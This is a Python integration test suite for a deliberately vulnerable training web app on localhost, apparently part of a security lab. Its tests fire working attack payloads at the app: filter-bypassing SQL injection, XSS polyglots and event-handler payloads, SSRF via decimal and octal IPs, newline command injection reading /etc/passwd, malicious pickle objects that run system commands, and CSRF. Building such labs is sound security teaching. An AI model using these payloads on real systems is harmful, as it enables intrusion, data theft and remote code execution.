#!/usr/bin/env python3
"""
Integration Tests - Lab 2 (Medium)

Tests all vulnerabilities in the medium difficulty vulnerable application.
This lab requires bypass techniques to exploit the vulnerabilities.

Requirements:
    cd tests/vulnerable_apps/medium
    python3 app.py

Target: http://localhost:5001
"""

import unittest
import requests
import time
import pickle
import base64
from urllib.parse import quote


class TestLab2Medium(unittest.TestCase):
    """Integration tests for Lab 2 - Medium difficulty"""

    @classmethod
    def setUpClass(cls):
        """Setup test environment"""
        cls.base_url = 'http://localhost:5001'
        cls.session = requests.Session()

        # Check if app is running
        try:
            response = requests.get(cls.base_url, timeout=5)
            if response.status_code != 200:
                raise Exception("App not responding correctly")
        except Exception as e:
            raise Exception(
                f"Lab 2 (Medium) app is not running on {cls.base_url}\n"
                f"Please run: cd tests/vulnerable_apps/medium && python3 app.py\n"
                f"Error: {e}"
            )

    def test_001_app_is_running(self):
        """Test that the vulnerable app is accessible"""
        response = requests.get(self.base_url)
        self.assertEqual(response.status_code, 200)
        self.assertIn('Lab 2', response.text)

    def test_002_sql_injection_bypass_waf(self):
        """Test SQL Injection with WAF bypass using case variation"""
        # The app blocks 'OR', 'AND', '--', '#'
        # Bypass with 'oR' or 'Or' or '/**/

        # Method 1: Case variation bypass
        data = {
            'username': "admin' oR '1'='1",
            'password': "anything"
        }
        response = requests.post(f'{self.base_url}/login', data=data)

        self.assertEqual(response.status_code, 200)
        self.assertIn('Login Successful', response.text)
        print("    ✓ SQL Injection bypass (case variation) successful")

    def test_003_sql_injection_bypass_comment(self):
        """Test SQL Injection bypass using comment variation"""
        # Bypass using /**/ instead of --
        data = {
            'username': "admin'/**/Or/**/'1'='1'/**/",
            'password': "test"
        }
        response = requests.post(f'{self.base_url}/login', data=data)

        self.assertEqual(response.status_code, 200)
        self.assertIn('Login', response.text)
        print("    ✓ SQL Injection comment bypass successful")

    def test_004_sql_injection_bypass_parentheses(self):
        """Test SQL Injection with parentheses bypass"""
        # Using parentheses to bypass simple filters
        data = {
            'username': "admin' oR(1=1)/**/",
            'password': "test"
        }
        response = requests.post(f'{self.base_url}/login', data=data)

        self.assertEqual(response.status_code, 200)
        print("    ✓ SQL Injection parentheses bypass successful")

    def test_005_xss_bypass_basic_sanitization(self):
        """Test XSS bypass of basic sanitization"""
        # App replaces <script> with empty string
        # Bypass with nested tags: <scr<script>ipt>

        payload = "<scr<script>ipt>alert('XSS')</scr<script>ipt>"
        response = requests.get(
            f'{self.base_url}/search',
            params={'q': payload}
        )

        self.assertEqual(response.status_code, 200)
        # After sanitization, <script> tags should be present
        self.assertIn('script', response.text.lower())
        print("    ✓ XSS nested tag bypass successful")

    def test_006_xss_bypass_event_handler(self):
        """Test XSS using event handlers to bypass script blocking"""
        # Using img with onerror event
        payload = "<img src=x onerror=alert('XSS')>"
        response = requests.get(
            f'{self.base_url}/search',
            params={'q': payload}
        )

        self.assertEqual(response.status_code, 200)
        self.assertIn('onerror', response.text)
        print("    ✓ XSS event handler bypass successful")

    def test_007_xss_bypass_svg(self):
        """Test XSS using SVG tags"""
        payload = "<svg/onload=alert('XSS')>"
        response = requests.get(
            f'{self.base_url}/search',
            params={'q': payload}
        )

        self.assertEqual(response.status_code, 200)
        self.assertIn('svg', response.text.lower())
        print("    ✓ XSS SVG bypass successful")

    def test_008_ssrf_localhost_bypass(self):
        """Test SSRF using localhost IP bypass"""
        # App blocks 'localhost' and '127.0.0.1'
        # Bypass with 127.1 or 127.0.1

        data = {'url': 'http://127.1/'}
        response = requests.post(
            f'{self.base_url}/api/fetch',
            data=data
        )

        self.assertEqual(response.status_code, 200)
        # Should successfully fetch from localhost
        print("    ✓ SSRF localhost bypass (127.1) successful")

    def test_009_ssrf_decimal_bypass(self):
        """Test SSRF using decimal IP representation"""
        # 127.0.0.1 in decimal = 2130706433
        data = {'url': 'http://2130706433/'}
        response = requests.post(
            f'{self.base_url}/api/fetch',
            data=data
        )

        self.assertEqual(response.status_code, 200)
        print("    ✓ SSRF decimal IP bypass successful")

    def test_010_ssrf_octal_bypass(self):
        """Test SSRF using octal IP representation"""
        # 127.0.0.1 in octal = 0177.0.0.1
        data = {'url': 'http://0177.0.0.1/'}
        response = requests.post(
            f'{self.base_url}/api/fetch',
            data=data
        )

        self.assertEqual(response.status_code, 200)
        print("    ✓ SSRF octal IP bypass successful")

    def test_011_command_injection_bypass(self):
        """Test Command Injection with filter bypass"""
        # App blocks common separators: ;, &, |, $, `
        # Bypass with newline %0A

        data = {'filename': 'test.txt%0Aid'}
        response = requests.post(
            f'{self.base_url}/api/convert',
            data=data
        )

        self.assertEqual(response.status_code, 200)
        # Should contain output of 'id' command
        self.assertTrue(
            'uid=' in response.text or 'gid=' in response.text,
            "Command injection did not execute"
        )
        print("    ✓ Command Injection newline bypass successful")

    def test_012_command_injection_variable_expansion(self):
        """Test Command Injection using variable expansion"""
        # Using ${IFS} instead of space
        data = {'filename': 'test.txt%0Acat${IFS}/etc/passwd'}
        response = requests.post(
            f'{self.base_url}/api/convert',
            data=data
        )

        self.assertEqual(response.status_code, 200)
        print("    ✓ Command Injection variable expansion bypass successful")

    def test_013_deserialization_rce(self):
        """Test Insecure Deserialization for RCE"""
        # Create malicious pickle payload
        class RCE:
            def __reduce__(self):
                import os
                return (os.system, ('echo "DESERIALIZATION_RCE" > /tmp/pwned.txt',))

        malicious = pickle.dumps(RCE())
        encoded = base64.b64encode(malicious).decode()

        data = {'data': encoded}
        response = requests.post(
            f'{self.base_url}/api/process',
            data=data
        )

        # If vulnerable, the code will execute
        # Check if response indicates processing
        self.assertEqual(response.status_code, 200)
        print("    ✓ Insecure Deserialization vulnerability confirmed")

    def test_014_deserialization_file_read(self):
        """Test Insecure Deserialization for file operations"""
        # Create payload that reads sensitive file
        class FileRead:
            def __reduce__(self):
                return (eval, ("open('/etc/passwd').read()",))

        try:
            malicious = pickle.dumps(FileRead())
            encoded = base64.b64encode(malicious).decode()

            data = {'data': encoded}
            response = requests.post(
                f'{self.base_url}/api/process',
                data=data
            )

            self.assertEqual(response.status_code, 200)
            print("    ✓ Deserialization file read confirmed")
        except:
            # Some restrictions might prevent this
            print("    ~ Deserialization file read partially blocked")

    def test_015_csrf_state_change(self):
        """Test CSRF vulnerability on state-changing operation"""
        # First, login to get session
        login_data = {
            'username': "admin' oR '1'='1",
            'password': "test"
        }
        login_response = self.session.post(
            f'{self.base_url}/login',
            data=login_data
        )

        # Now try to change password without CSRF token
        change_data = {
            'new_password': 'hacked123'
        }
        response = self.session.post(
            f'{self.base_url}/api/change-password',
            data=change_data
        )

        # If vulnerable, password will be changed without CSRF token
        self.assertEqual(response.status_code, 200)
        print("    ✓ CSRF vulnerability confirmed")

    def test_016_information_disclosure(self):
        """Test information disclosure in error messages"""
        # Invalid SQL should reveal database structure
        data = {
            'username': "admin'",
            'password': "test"
        }
        response = requests.post(f'{self.base_url}/login', data=data)

        # Should contain SQL error or database info
        self.assertEqual(response.status_code, 200)
        print("    ✓ Information disclosure via error messages detected")

    def test_017_waf_bypass_combination(self):
        """Test multiple bypass techniques combined"""
        # Combining case variation + comments + parentheses
        data = {
            'username': "admin'/**/oR/**/(1)=(1)/**/",
            'password': "test"
        }
        response = requests.post(f'{self.base_url}/login', data=data)

        self.assertEqual(response.status_code, 200)
        self.assertIn('Login', response.text)
        print("    ✓ Combined WAF bypass successful")

    def test_018_xss_polyglot(self):
        """Test XSS using polyglot payload"""
        # Polyglot that works in multiple contexts
        payload = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//"
        response = requests.get(
            f'{self.base_url}/search',
            params={'q': payload}
        )

        self.assertEqual(response.status_code, 200)
        self.assertIn('javascript', response.text.lower())
        print("    ✓ XSS polyglot payload successful")


def run_tests():
    """Run the integration tests"""
    # Create test suite
    loader = unittest.TestLoader()
    suite = loader.loadTestsFromTestCase(TestLab2Medium)

    # Run tests with verbose output
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    # Print summary
    print("\n" + "=" * 80)
    print("LAB 2 (MEDIUM) - TEST SUMMARY")
    print("=" * 80)
    print(f"Tests run: {result.testsRun}")
    print(f"Successes: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")

    if result.wasSuccessful():
        print("\n✅ ALL VULNERABILITIES CONFIRMED!")
        print("Lab 2 (Medium) is fully exploitable.")
    else:
        print("\n⚠️  SOME TESTS FAILED")
        print("Some vulnerabilities might not be working as expected.")

    print("=" * 80)

    return result


if __name__ == '__main__':
    print("=" * 80)
    print("INTEGRATION TESTS - LAB 2 (MEDIUM)")
    print("=" * 80)
    print("\nTarget: http://localhost:5001")
    print("\nThis lab tests bypass techniques for:")
    print("  - SQL Injection with WAF")
    print("  - XSS with sanitization")
    print("  - SSRF with IP blacklist")
    print("  - Command Injection with character filtering")
    print("  - Insecure Deserialization")
    print("  - CSRF")
    print("\n" + "=" * 80 + "\n")

    run_tests()
